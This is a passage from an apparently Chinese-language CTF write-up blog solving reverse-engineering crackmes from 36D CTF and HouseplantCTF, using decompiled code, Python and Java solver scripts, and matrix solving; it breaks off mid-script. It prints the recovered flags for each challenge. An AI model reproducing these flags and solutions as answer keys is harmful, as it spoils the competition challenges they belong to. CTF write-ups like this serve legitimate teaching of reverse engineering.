sub_4113E3(a1, a3, (int)&amp;savedregs, a4, (int)step2); v14 = v7; v13 = v6; sub_411258((int)&amp;savedregs, (int)dword_41589C); return sub_411235(v8, v14, 1, v13, a1);} 下面的处理就是把key求和赋值给v15，然后将内容中的数组逐项与v15相加然后异或 12345678910111213141516171819202122232425262728293031323334353637int __usercall sub_415970@&lt;eax&gt;(int a1@&lt;xmm0&gt;, int ebx0@&lt;ebx&gt;, int a3@&lt;edi&gt;, int a4@&lt;esi&gt;, int target){ int v5; // STF0_4 int v6; // eax int v7; // edx int v8; // ST04_4 int v9; // ST00_4 signed int i; // [esp+DCh] [ebp-84h] int v12; // [esp+E8h] [ebp-78h] int v13; // [esp+E8h] [ebp-78h] char v14[104]; // [esp+F4h] [ebp-6Ch] int v15; // [esp+15Ch] [ebp-4h] int savedregs; // [esp+160h] [ebp+0h] sub_41122B((int)&amp;unk_41C032); v12 = 0; for ( i = 0; i &lt; 9; ++i ) { v14[v12] = *(_BYTE *)(target + 4 * i); v5 = v12 + 1; v14[v5++] = *(_BYTE *)(target + 4 * i + 36); v14[v5++] = *(_BYTE *)(target + 4 * i + 72); v14[v5] = *(_BYTE *)(target + 4 * i + 108); v12 = v5 + 1; } v14[v12] = *(_BYTE *)(target + 144); v13 = v12 + 1; v14[v13] = *(_BYTE *)(target + 148); if ( (unsigned int)(v13 + 1) &gt;= 0x64 ) sub_411168(ebx0, a3, a4); v14[v13 + 1] = 0; v6 = printf((int)\"\\n%s\\n\", (unsigned int)v14); v8 = v7; v9 = v6; sub_411258((int)&amp;savedregs, (int)dword_415AF0); return sub_411235((unsigned int)&amp;savedregs ^ v15, v8, 1, v9, a1);} 之后就是每9位一组，把得到的字符串重新排序然后输出，但是没有这么轻松，输出的是乱码，因为用来异或的数只有在TLS回调函数里面用到了，如果正常运行的话应该是0，并没有什么意义，所以很显然这题只要调试一下输出的应该就是真正的flag，OD装了hidden忘了关掉，调试了一次发现输出还是乱码，干脆直接算出这个数 1234567891011121314151617181920212223step1 = \"wangzherongyao\"v15 = 0for i in range(len(step1)): v15 += ord(step1[i])final = [0xFFFFF9A6, 0xFFFFF991, 0xFFFFF9D3, 0xFFFFF9A8, 0xFFFFF9DC, 0xFFFFF9D5, 0xFFFFF9DC, 0xFFFFF9D4, 0xFFFFF9D8, 0xFFFFF9A0, 0xFFFFF9D3, 0xFFFFF9A7, 0xFFFFF9A8, 0xFFFFF9D4, 0xFFFFF9DB, 0xFFFFF9A9, 0xFFFFF9D3, 0xFFFFF9A8, 0xFFFFF9AB, 0xFFFFF9D3, 0xFFFFF9DA, 0xFFFFF9D6, 0xFFFFF9D4, 0xFFFFF9AB, 0xFFFFF9AB, 0xFFFFF9DB, 0xFFFFF9A9, 0xFFFFF9A5, 0xFFFFF9D6, 0xFFFFF9A8, 0xFFFFF9D8, 0xFFFFF9A6, 0xFFFFF9A6, 0xFFFFF9AB, 0xFFFFF9AA, 0xFFFFF9D6, 0xFFFFF9D9, 0xFFFFF98F]for i in range(38): final[i] = (final[i] + v15) &amp; 0xffv = final[0] ^ ord('f')for i in range(38): final[i] = final[i] ^ vflag = \"\"for i in range(9): flag += chr(final[i]) flag += chr(final[i + 9]) flag += chr(final[i + 9 * 2]) flag += chr(final[i + 9 * 3])flag += chr(final[36]) + chr(final[37])print(flag)# flag{9969e2ddd64088f71af0caa891b4dc63} BBBigEqSet打开发现函数很大，有很多式子，无脑z3必定跑不出来，下面只截取了一部分 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667int __cdecl __noreturn main(int argc, const char **argv, const char **envp){ int v3; // edx int v4; // edx int v5; // edx int v6; // edx int v7; // edx int v8; // edx int v9; // edx int v10; // edx int v11; // edx int v12; // edx int v13; // edx int v14; // edx int v15; // edx int v16; // edx int v17; // edx int v18; // edx int v19; // edx int v20; // edx int v21; // edx int v22; // edx int v23; // edx int v24; // edx int v25; // edx int v26; // edx int v27; // edx int v28; // edx int v29; // edx int v30; // edx int v31; // edx int v32; // edx int v33; // edx int v34; // edx int v35; // edx int v36; // edx int v37; // edx int v38; // edx int v39; // edx int v40; // edx int v41; // edx int v42; // edx int v43; // edx int v44; // edx int v45; // edx int v46; // edx int v47; // edx int v48; // edx int v49; // edx int v50; // edx int v51; // edx int v52; // edx int v53; // edx int v54; // edx int v55; // edx int v56; // edx int v57; // edx int v58; // edx int v59; // edx int v60; // edx int v61; // edx int v62; // edx int v63; // edx int v64; // edx int v65; // edx int v66; // edx int v67; // edx int v68; // edx int v69; // edx int v70; // edx int v71; // edx int v72; // edx int v73; // edx int v74; // edx int v75; // edx int v76; // edx int v77; // edx int v78; // edx int v79; // edx int v80; // edx int v81; // edx int v82; // edx int v83; // edx int v84; // edx int v85; // edx int v86; // edx int v87; // edx int v88; // edx int v89; // edx int v90; // edx int v91; // edx int v92; // edx int v93; // edx int v94; // edx int v95; // edx int v96; // edx int v97; // edx int v98; // edx int v99; // edx int v100; // edx int v101; // edx int v102; // edx int v103; // edx int v104; // edx int v105; // edx int v106; // edx int v107; // edx int v108; // edx int v109; // edx int v110; // edx int v111; // edx int v112; // edx int v113; // edx int v114; // edx int v115; // edx int v116; // edx int v117; // edx int v118; // edx int v119; // edx int v120; // edx int v121; // edx int v122; // edx int v123; // edx int v124; // edx int v125; // edx int v126; // edx int v127; // edx int v128; // edx int v129; // edx int v130; // edx int v131; // edx int v132; // edx int v133; // edx int v134; // edx int v135; // edx int v136; // edx int v137; // edx int v138; // edx int v139; // edx int v140; // edx int v141; // edx int v142; // edx int v143; // edx int v144; // edx int v145; // edx int v146; // edx int v147; // edx int v148; // edx int v149; // edx int v150; // edx int v151; // edx int v152; // edx int v153; // edx int v154; // edx int v155; // edx int v156; // edx int v157; // edx int v158; // edx int v159; // edx int v160; // edx int v161; // edx int v162; // edx int v163; // edx int v164; // edx int v165; // edx int v166; // edx int v167; // edx int v168; // edx int v169; // edx int v170; // edx int v171; // edx int v172; // edx int v173; // edx int v174; // edx int v175; // edx int v176; // edx int v177; // edx int v178; // edx int v179; // edx int v180; // edx int v181; // edx int v182; // edx int v183; // edx int v184; // edx int v185; // edx int v186; // edx int v187; // edx int v188; // edx int v189; // edx int v190; // edx int v191; // edx int v192; // edx int v193; // edx int v194; // edx int v195; // edx int v196; // edx int v197; // edx int v198; // edx int v199; // edx int v200; // edx int v201; // edx int v202; // edx int v203; // edx int v204; // edx int v205; // edx int v206; // edx int v207; // edx int v208; // edx int v209; // edx int v210; // edx int v211; // edx int v212; // edx int v213; // edx int v214; // edx int v215; // edx int v216; // edx int v217; // edx int v218; // edx int v219; // edx int v220; // edx int v221; // edx int v222; // edx int v223; // edx int v224; // edx int v225; // edx int v226; // edx int v227; // edx int v228; // edx int v229; // edx int v230; // edx int v231; // edx int v232; // edx int v233; // edx int v234; // edx int v235; // edx int v236; // edx int v237; // edx int v238; // edx int v239; // edx int v240; // edx int v241; // edx int v242; // edx int v243; // edx int v244; // edx int v245; // edx int v246; // edx int v247; // edx int v248; // edx int v249; // edx int v250; // edx int v251; // edx int v252; // edx int v253; // edx int v254; // edx int v255; // edx int v256; // edx int v257; // edx int v258; // edx int v259; // edx int v260; // edx int v261; // edx int v262; // edx int v263; // edx int v264; // edx int v265; // edx int v266; // edx int v267; // edx int v268; // edx int v269; // edx int v270; // edx int v271; // edx int v272; // edx int v273; // edx int v274; // edx int v275; // edx int v276; // edx int v277; // edx int v278; // edx int v279; // edx int v280; // edx int v281; // edx int v282; // edx int v283; // edx int v284; // edx int v285; // edx int v286; // edx int v287; // edx int v288; // edx int v289; // edx int v290; // edx int v291; // edx int v292; // edx int v293; // edx int v294; // edx int v295; // edx int v296; // edx int v297; // edx int v298; // edx int v299; // edx int v300; // edx int v301; // edx int v302; // edx int v303; // edx int v304; // edx int v305; // edx int v306; // edx int v307; // edx int v308; // edx int v309; // edx int v310; // edx int v311; // edx int v312; // edx int v313; // edx int v314; // edx int v315; // edx int v316; // edx int v317; // edx int v318; // edx int v319; // edx int v320; // edx int v321; // edx int v322; // edx int v323; // edx int v324; // edx int v325; // edx int v326; // edx int v327; // edx int v328; // edx int v329; // edx int v330; // edx int v331; // edx int v332; // edx int v333; // edx int v334; // edx int v335; // edx int v336; // edx int v337; // edx int v338; // edx int v339; // edx int v340; // edx int v341; // edx int v342; // edx int v343; // edx int v344; // edx int v345; // edx int v346; // edx int v347; // edx int v348; // edx int v349; // edx int v350; // edx int v351; // edx int v352; // edx int v353; // edx int v354; // edx int v355; // edx int v356; // edx int v357; // edx int v358; // edx int v359; // edx int v360; // edx int v361; // edx int v362; // edx int v363; // edx int v364; // edx int v365; // edx int v366; // edx int v367; // edx int v368; // edx int v369; // edx int v370; // edx int v371; // edx int v372; // edx int v373; // edx int v374; // edx int v375; // edx int v376; // edx int v377; // edx int v378; // edx int v379; // edx int v380; // edx int v381; // edx int v382; // edx int v383; // edx int v384; // edx int v385; // edx int v386; // edx char s; // [rsp+0h] [rbp-100h] char v388; // [rsp+1h] [rbp-FFh] char v389; // [rsp+2h] [rbp-FEh] char v390; // [rsp+3h] [rbp-FDh] char v391; // [rsp+4h] [rbp-FCh] char v392; // [rsp+5h] [rbp-FBh] char v393; // [rsp+6h] [rbp-FAh] char v394; // [rsp+7h] [rbp-F9h] char v395; // [rsp+8h] [rbp-F8h] char v396; // [rsp+9h] [rbp-F7h] char v397; // [rsp+Ah] [rbp-F6h] char v398; // [rsp+Bh] [rbp-F5h] char v399; // [rsp+Ch] [rbp-F4h] char v400; // [rsp+Dh] [rbp-F3h] char v401; // [rsp+Eh] [rbp-F2h] char v402; // [rsp+Fh] [rbp-F1h] char v403; // [rsp+10h] [rbp-F0h] char v404; // [rsp+11h] [rbp-EFh] char v405; // [rsp+12h] [rbp-EEh] char v406; // [rsp+13h] [rbp-EDh] char v407; // [rsp+14h] [rbp-ECh] char v408; // [rsp+15h] [rbp-EBh] char v409; // [rsp+16h] [rbp-EAh] char v410; // [rsp+17h] [rbp-E9h] char v411; // [rsp+18h] [rbp-E8h] char v412; // [rsp+19h] [rbp-E7h] char v413; // [rsp+1Ah] [rbp-E6h] char v414; // [rsp+1Bh] [rbp-E5h] char v415; // [rsp+1Ch] [rbp-E4h] char v416; // [rsp+1Dh] [rbp-E3h] char v417; // [rsp+1Eh] [rbp-E2h] char v418; // [rsp+1Fh] [rbp-E1h] char v419; // [rsp+20h] [rbp-E0h] char v420; // [rsp+21h] [rbp-DFh] char v421; // [rsp+22h] [rbp-DEh] char v422; // [rsp+23h] [rbp-DDh] char v423; // [rsp+24h] [rbp-DCh] char v424; // [rsp+25h] [rbp-DBh] char v425; // [rsp+26h] [rbp-DAh] char v426; // [rsp+27h] [rbp-D9h] char v427; // [rsp+28h] [rbp-D8h] char v428; // [rsp+29h] [rbp-D7h] char v429; // [rsp+2Ah] [rbp-D6h] char v430; // [rsp+2Bh] [rbp-D5h] char v431; // [rsp+2Ch] [rbp-D4h] char v432; // [rsp+2Dh] [rbp-D3h] char v433; // [rsp+2Eh] [rbp-D2h] char v434; // [rsp+2Fh] [rbp-D1h] char v435; // [rsp+30h] [rbp-D0h] char v436; // [rsp+31h] [rbp-CFh] char v437; // [rsp+32h] [rbp-CEh] char v438; // [rsp+33h] [rbp-CDh] char v439; // [rsp+34h] [rbp-CCh] char v440; // [rsp+35h] [rbp-CBh] char v441; // [rsp+36h] [rbp-CAh] char v442; // [rsp+37h] [rbp-C9h] char v443; // [rsp+38h] [rbp-C8h] char v444; // [rsp+39h] [rbp-C7h] char v445; // [rsp+3Ah] [rbp-C6h] char v446; // [rsp+3Bh] [rbp-C5h] char v447; // [rsp+3Ch] [rbp-C4h] char v448; // [rsp+3Dh] [rbp-C3h] char v449; // [rsp+3Eh] [rbp-C2h] char v450; // [rsp+3Fh] [rbp-C1h] char v451; // [rsp+40h] [rbp-C0h] char v452; // [rsp+41h] [rbp-BFh] char v453; // [rsp+42h] [rbp-BEh] char v454; // [rsp+43h] [rbp-BDh] char v455; // [rsp+44h] [rbp-BCh] char v456; // [rsp+45h] [rbp-BBh] char v457; // [rsp+46h] [rbp-BAh] char v458; // [rsp+47h] [rbp-B9h] char v459; // [rsp+48h] [rbp-B8h] char v460; // [rsp+49h] [rbp-B7h] char v461; // [rsp+4Ah] [rbp-B6h] char v462; // [rsp+4Bh] [rbp-B5h] char v463; // [rsp+4Ch] [rbp-B4h] char v464; // [rsp+4Dh] [rbp-B3h] char v465; // [rsp+4Eh] [rbp-B2h] char v466; // [rsp+4Fh] [rbp-B1h] char v467; // [rsp+50h] [rbp-B0h] char v468; // [rsp+51h] [rbp-AFh] char v469; // [rsp+52h] [rbp-AEh] char v470; // [rsp+53h] [rbp-ADh] char v471; // [rsp+54h] [rbp-ACh] char v472; // [rsp+55h] [rbp-ABh] char v473; // [rsp+56h] [rbp-AAh] char v474; // [rsp+57h] [rbp-A9h] char v475; // [rsp+58h] [rbp-A8h] char v476; // [rsp+59h] [rbp-A7h] char v477; // [rsp+5Ah] [rbp-A6h] char v478; // [rsp+5Bh] [rbp-A5h] char v479; // [rsp+5Ch] [rbp-A4h] char v480; // [rsp+5Dh] [rbp-A3h] char v481; // [rsp+5Eh] [rbp-A2h] char v482; // [rsp+5Fh] [rbp-A1h] char v483; // [rsp+60h] [rbp-A0h] char v484; // [rsp+61h] [rbp-9Fh] char v485; // [rsp+62h] [rbp-9Eh] char v486; // [rsp+63h] [rbp-9Dh] char v487; // [rsp+64h] [rbp-9Ch] char v488; // [rsp+65h] [rbp-9Bh] char v489; // [rsp+66h] [rbp-9Ah] char v490; // [rsp+67h] [rbp-99h] char v491; // [rsp+68h] [rbp-98h] char v492; // [rsp+69h] [rbp-97h] char v493; // [rsp+6Ah] [rbp-96h] char v494; // [rsp+6Bh] [rbp-95h] char v495; // [rsp+6Ch] [rbp-94h] char v496; // [rsp+6Dh] [rbp-93h] char v497; // [rsp+6Eh] [rbp-92h] char v498; // [rsp+6Fh] [rbp-91h] char v499; // [rsp+70h] [rbp-90h] char v500; // [rsp+71h] [rbp-8Fh] char v501; // [rsp+72h] [rbp-8Eh] char v502; // [rsp+73h] [rbp-8Dh] char v503; // [rsp+74h] [rbp-8Ch] char v504; // [rsp+75h] [rbp-8Bh] char v505; // [rsp+76h] [rbp-8Ah] char v506; // [rsp+77h] [rbp-89h] char v507; // [rsp+78h] [rbp-88h] char v508; // [rsp+79h] [rbp-87h] char v509; // [rsp+7Ah] [rbp-86h] char v510; // [rsp+7Bh] [rbp-85h] char v511; // [rsp+7Ch] [rbp-84h] char v512; // [rsp+7Dh] [rbp-83h] char v513; // [rsp+7Eh] [rbp-82h] char v514; // [rsp+7Fh] [rbp-81h] printf(\"Give me Flag:\", argv, envp); __isoc99_scanf(\"%128s\", &amp;s); if ( strlen(&amp;s) == 128 ) { v3 = 64538 * v429 + 42900 * v428 + 18329 * v427 + 60412 * v426 + 60307 * v425 + 18530 * v424 + 51121 * v423 + 50282 * v422 + 46722 * v421 + 44487 * v420 + 38419 * v419 + 46190 * v418 + 18243 * v417 + 40252 * v416 + 41765 * v415 + 20132 * v414 + 21211 * v413 + 27153 * v412 + 46112 * v411 + 59321 * v410 + 49412 * v409 + 42549 * v408 + 21824 * v407 + 21129 * v406 + 18066 * v405 + 43022 * v404 + 54055 * v403 + 38707 * v402 + 48128 * v401 + 60067 * v400 + 36126 * v399 + 27472 * v398 + 19052 * v397 + 40829 * v396 + 39355 * v395 + 61052 * v394 + 40870 * v393 + 57038 * v392 + 32494 * v391 + 27938 * v390 + 19407 * v389 + 24781 * v388 + 37921 * s; v4 = 24771 * v471 + 33991 * v470 + 31417 * v469 + 59818 * v468 + 39294 * v467 + 36226 * v466 + 39486 * v465 + 57710 * v464 + 42226 * v463 + 49425 * v462 + 36772 * v461 + 28905 * v460 + 56121 * v459 + 52847 * v458 + 42837 * v457 + 49578 * v456 + 40181 * v455 + 40989 * v454 + 49484 * v453 + 51756 * v452 + 63499 * v451 + 24443 * v450 + 44983 * v449 + 29121 * v448 + 45920 * v447 + 31270 * v446 + 32548 * v445 + 42180 * v444 + 28781 * v443 + 20664 * v442 + 31970 * v441 + 37429 * v440 + 61803 * v439 + 33044 * v438 + 56440 * v437 + 37835 * v436 + 32992 * v435 + 52454 * v434 + 65272 * v433 + 37799 * v432 + 50401 * v431 + 31920 * v430 + v3; v5 = 48499 * v513 + 18203 * v512 + 65067 * v511 + 30665 * v510 + 58990 * v509 + 37148 * v508 + 61681 * v507 + 51316 * v506 + 64090 * v505 + 57189 * v504 + 58206 * v503 + 52880 * v502 + 56821 * v501 + 21676 * v500 + 28817 * v499 + 20060 * v498 + 24492 * v497 + 52094 * v496 + 63505 * v495 + 57244 * v494 + 50929 * v493 + 61554 * v492 + 51708 * v491 + 65257 * v490 + 37567 * v489 + 54352 * v488 + 55426 * v487 + 49466 * v486 + 28952 * v485 + 47589 * v484 + 22287 * v483 + 49762 * v482 + 58791 * v481 + 30764 * v480 + 40171 * v479 + 26026 * v478 + 31717 * v477 + 54297 * v476 + 53803 * v475 + 62356 * v474 + 37562 * v473 + 47359 * v472 + v4; if ( v5 + 33908 * v514 == 451221610 ) { ............ if ( v380 + 48903 * v514 == 428074321 ) { v381 = 18255 * v429 + 27862 * v428 + 49507 * v427 + 50734 * v426 + 46584 * v425 + 22147 * v424 + 37539 * v423 + 47096 * v422 + 46464 * v421 + 36058 * v420 + 22895 * v419 + 41196 * v418 + 56603 * v417 + 54009 * v416 + 31454 * v415 + 23228 * v414 + 39219 * v413 + 54012 * v412 + 40791 * v411 + 60791 * v410 + 60818 * v409 + 57486 * v408 + 46241 * v407 + 24079 * v406 + 40128 * v405 + 47273 * v404 + 40612 * v403 + 32341 * v402 + 20015 * v401 + 38073 * v400 + 41230 * v399 + 61648 * v398 + 33734 * v397 + 61659 * v396 + 61614 * v395 + 52377 * v394 + 46854 * v393 + 21778 * v392 + 56660 * v391 + 63546 * v390 + 28059 * v389 + 23740 * v388 + 51085 * s; v382 = 32419 * v471 + 25641 * v470 + 45499 * v469 + 19322 * v468 + 43032 * v467 + 23307 * v466 + 55448 * v465 + 53137 * v464 + 28623 * v463 + 18253 * v462 + 22115 * v461 + 49428 * v460 + 53125 * v459 + 55383 * v458 + 33400 * v457 + 56702 * v456 + 26964 * v455 + 61361 * v454 + 61475 * v453 + 24641 * v452 + 44331 * v451 + 45772 * v450 + 26200 * v449 + 16929 * v448 + 54818 * v447 + 51368 * v446 + 53472 * v445 + 32905 * v444 + 29339 * v443 + 46501 * v442 + 41223 * v441 + 51734 * v440 + 28049 * v439 + 29015 * v438 + 21595 * v437 + 61661 * v436 + 38454 * v435 + 42127 * v434 + 20790 * v433 + 46685 * v432 + 59201 * v431 + 18163 * v430 + v381; v383 = 59175 * v513 + 39108 * v512 + 47897 * v511 + 30517 * v510 + 48502 * v509 + 21234 * v508 + 16881 * v507 + 33497 * v506 + 44346 * v505 + 34046 * v504 + 62689 * v503 + 61793 * v502 + 39949 * v501 + 51645 * v500 + 45006 * v499 + 30211 * v498 + 36412 * v497 + 50291 * v496 + 61936 * v495 + 24289 * v494 + 36906 * v493 + 39057 * v492 + 37973 * v491 + 38451 * v490 + 44004 * v489 + 36870 * v488 + 41842 * v487 + 56352 * v486 + 44525 * v485 + 55182 * v484 + 61692 * v483 + 22202 * v482 + 46291 * v481 + 43770 * v480 + 33996 * v479 + 16488 * v478 + 41249 * v477 + 30433 * v476 + 19083 * v475 + 64629 * v474 + 39094 * v473 + 20548 * v472 + v382; if ( v383 + 48644 * v514 == 436619163 ) { v384 = 20405 * v429 + 55744 * v428 + 53951 * v427 + 58954 * v426 + 58301 * v425 + 43146 * v424 + 50020 * v423 + 57986 * v422 + 32136 * v421 + 54559 * v420 + 36067 * v419 + 55753 * v418 + 52141 * v417 + 19801 * v416 + 51943 * v415 + 52352 * v414 + 59995 * v413 + 61920 * v412 + 21345 * v411 + 36243 * v410 + 24006 * v409 + 57833 * v408 + 60630 * v407 + 26409 * v406 + 55315 * v405 + 55536 * v404 + 56726 * v403 + 35936 * v402 + 52089 * v401 + 23346 * v400 + 37583 * v399 + 28011 * v398 + 63252 * v397 + 45544 * v396 + 31278 * v395 + 53351 * v394 + 59214 * v393 + 56389 * v392 + 21264 * v391 + 43663 * v390 + 50056 * v389 + 29807 * v388 + 54629 * s; v385 = 34777 * v471 + 31197 * v470 + 30616 * v469 + 36452 * v468 + 26811 * v467 + 36716 * v466 + 56574 * v465 + 26609 * v464 + 61561 * v463 + 53940 * v462 + 42728 * v461 + 47488 * v460 + 27142 * v459 + 43536 * v458 + 50520 * v457 + 23098 * v456 + 26887 * v455 + 20179 * v454 + 50829 * v453 + 52275 * v452 + 46516 * v451 + 63611 * v450 + 59165 * v449 + 64759 * v448 + 38581 * v447 + 59893 * v446 + 30951 * v445 + 40268 * v444 + 49167 * v443 + 21028 * v442 + 51890 * v441 + 46565 * v440 + 17053 * v439 + 62330 * v438 + 51110 * v437 + 47835 * v436 + 62399 * v435 + 57967 * v434 + 24624 * v433 + 64106 * v432 + 25896 * v431 + 50027 * v430 + v384; v386 = 43090 * v513 + 60146 * v512 + 58416 * v511 + 17103 * v510 + 39414 * v509 + 32649 * v508 + 45967 * v507 + 20158 * v506 + 37299 * v505 + 20670 * v504 + 46301 * v503 + 31897 * v502 + 62016 * v501 + 63284 * v500 + 32156 * v499 + 40720 * v498 + 36471 * v497 + 27360 * v496 + 50777 * v495 + 25651 * v494 + 64743 * v493 + 59790 * v492 + 22455 * v491 + 64238 * v490 + 37757 * v489 + 60849 * v488 + 30086 * v487 + 34636 * v486 + 18797 * v485 + 33985 * v484 + 46073 * v483 + 24947 * v482 + 48851 * v481 + 24773 * v480 + 41489 * v479 + 17636 * v478 + 32373 * v477 + 35731 * v476 + 19021 * v475 + 17532 * v474 + 63794 * v473 + 44087 * v472 + v385; if ( v386 + 55482 * v514 == 452784657 ) { puts(\"YOU GET IT! YEEEEEAAA\"); exit(0); } ......... 观察一下很容易发现，这就是个简单的矩阵乘法，算AX=b，解起来很轻松，但是数据是在太多了，只能写脚本处理一下，本着简单使用的原则，把所有的数字找出来然后提取大于515的部分，就是所有用到的数，观察一下发现每一个处理变量的位置都是不变的，所以对应的数据的位置也是不变的，所以按照顺序提取一下就行了，最后再调整一下顺序就出来了 1234567891011121314151617181920212223242526272829303132333435363738394041import reimport numpy as nps = \"\"with open('bigequition.txt', 'r+') as f: s += f.read()num = re.findall('\\d+', s)nums = []for i in num: tmp = int(i) if tmp &gt; 515: nums.append(tmp)arr = []result = []for i in range(128): t_tmp = [] for j in range(128): t_tmp.append(nums[129 * i + j]) arr.append(t_tmp) result.append(nums[129 * i + 128])# print(arr)# print(result)A = np.array(arr)B = np.array([result])b = np.transpose(B)A_inv = np.linalg.inv(A)x = np.dot(A_inv, b)x = np.rint(x)flag = \"\"for i in range(43): flag += chr(int(x[42 - i]))for i in range(42): flag += chr(int(x[43 + 41 - i]))for i in range(42): flag += chr(int(x[43 + 42 + 41 - i]))flag += chr(int(x[-1]))print(flag)# flag{Soooo000_LooOOOOOOOOggO99g99_s1muLtaNeOus_EEEQuat10n5_Y0UUUUUUuuu_cAA44AANNnnN_SOOOOOOLVE_IT17TT11771ITIT!!!_8ShotDshP90ab} 本来没想到这题这么简单，放假玩了一天晚上睡前才看了一眼，错过一血，错亿","link":"/2020/03/21/2020-36DCTF/"},{"title":"HouseplantCTF-wp","text":"最近没有太多时间，这个比赛又比较简单，就干脆直接放脚本了 beginnersbeginner 1base64 beginner 212345678target = [0x72, 0x74, 0x63, 0x70, 0x7b, 0x62, 0x6f, 0x62, 0x5f, 0x79, 0x6f, 0x75, 0x5f, 0x73, 0x75, 0x63, 0x6b, 0x5f, 0x61, 0x74, 0x5f, 0x62, 0x65, 0x69, 0x6e, 0x67, 0x5f, 0x65, 0x6e, 0x63, 0x6f, 0x75, 0x72, 0x61, 0x67, 0x69, 0x6e, 0x67, 0x7d]flag = ''for i in target: flag += chr(i)print(flag)# rtcp{bob_you_suck_at_being_encouraging} reverse-engineeringFragile1234567891011121314151617181920212223242526package com.company;import static java.lang.System.exit;import java.util.Scanner;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import javax.crypto.Cipher;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.DESKeySpec;public class Main { public static void main(String[] var0) throws Exception { String flag = \"h1_th3r3_1ts_m3\"; String theflag = \"ÐdØÓ§åÍaèÒÁ¡\"; String f=\"\"; for (int i = 0; i &lt; flag.length(); i++) { f += (char) ((int) (theflag.charAt(i)) - (int) (flag.charAt(i))); } System.out.println(f); }}// rtcp{h3y_1ts_n0t_b4d} EZ1rtcp{tH1s_i5_4_r3aL_fL4g_s0_Do_sUbm1T_1t!} PZ1rtcp{iT5_s1mPlY_1n_tH3_C0d3} LEMON1rtcp{y34H_tHiS_a1nT_sEcuR3} SQUEEZY12345678import base64en = 'HxEMBxUAURg6I0QILT4UVRolMQFRHzokRBcmAygNXhkqWBw='enc = base64.b64decode(en)key = \"meownyameownyameownyameownyameownya\"flag = ''.join(chr(ord(a) ^b) for a, b in zip(key, enc))print(flag)# rtcp{y0u_L3fT_y0uR_x0r_K3y_bEh1nD!} thedanzman123456789101112import base64import codecsen = \"=ZkXipjPiLIXRpIYTpQHpjSQkxIIFbQCK1FR3DuJZxtPAtkR\"en = en[::-1]key = \"nyameowpurrpurrnyanyapurrpurrnyanya\"key = codecs.encode(key, \"rot_13\")d = codecs.encode(en, 'rot_13')e = base64.b64decode(d)f = ''.join(chr(ord(a) ^ b) for a, b in zip(key, e))print(f)# rtcp{n0w_tH4T_w45_m0r3_cH4lL3NgiNG} Breakable12345678910111213141516171819202122232425262728293031package com.company;import static java.lang.System.exit;import java.util.Scanner;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import javax.crypto.Cipher;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.DESKeySpec;public class Main { public static void main(String[] var0) throws Exception { String flag = \"k33p_1t_in_pl41n\"; String theflag = \"ÒdÝ¾¤¤¾ÙàåÐcÝÆ¥ÌÈáÏÜ¦aã\"; String f1=\"\"; String f2=\"\"; for (int i = 0; i &lt; flag.length()-2; i++) { f1 += (char) ((int) (theflag.charAt(i+14)) - (int) (flag.charAt(i+2))); } System.out.println(f1); for (int i = 0; i &lt; flag.length()-2; i++) { f2 += (char) ((int) (theflag.charAt(i)) - (int) (flag.charAt(i))); } System.out.println(f2); }}// rtcp{0mg_1m_s0_pr0ud_} Bendy1234567891011121314151617181920flag = \"r34l_g4m3rs_eXclus1v3\"theflag = \"ÄÑÓ¿ÂÒêáøz§è§ñy÷¦\"f1 = theflag[:9]f2 = theflag[9:]ff = \"\"f = \"\"for i in range(9): ff += chr(ord(f2[i]) - 20)for i in range(9): ff += f1for i in range(10, 15): f += chr(ord(ff[i - 3]) - ord(flag[i]))f += \" \"for i in range(7): f += chr(ord(ff[i]) - ord(flag[i]))for i in range(15, 21): f += chr(ord(ff[i - 3]) - ord(flag[i - 3]))print(f)#rtcp{hop3_y0ur3_h4v1ng_fun} Tough123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package com.company;import java.util.HashMap;public class Main { public static int[] realflag = {9, 4, 23, 8, 17, 1, 18, 0, 13, 7, 2, 20, 16, 10, 22, 12, 19, 6, 15, 21, 3, 14, 5, 11}; public static int[] therealflag = {20, 16, 12, 9, 6, 15, 21, 3, 18, 0, 13, 7, 1, 4, 23, 8, 17, 2, 10, 22, 19, 11, 14, 5}; public static HashMap&lt;Integer, Character&gt; theflags = new HashMap&lt;&gt;(); public static HashMap&lt;Integer, Character&gt; theflags0 = new HashMap&lt;&gt;(); public static HashMap&lt;Integer, Character&gt; theflags1 = new HashMap&lt;&gt;(); public static HashMap&lt;Integer, Character&gt; theflags2 = new HashMap&lt;&gt;(); public static boolean m = true; public static boolean g = false; public static void createMap(HashMap owo, String input, boolean uwu) { if (uwu) { for (int i = 0; i &lt; input.length(); i++) { owo.put(realflag[i], input.charAt(i)); } } else { for (int i = 0; i &lt; input.length(); i++) { owo.put(therealflag[i], input.charAt(i)); } } } public static void main(String[] var0) throws Exception { String flag = \"ow0_wh4t_4_h4ckr_y0u_4r3\"; createMap(theflags0, flag, g); createMap(theflags2, flag, m); int[] thefinalflag = {157, 157, 236, 168, 160, 162, 171, 162, 165, 199, 169, 169, 160, 194, 235, 207, 227, 210, 157, 203, 227, 104, 212, 202}; String s=\"\"; char[] f = new char[24]; for (int p = 0; p &lt; 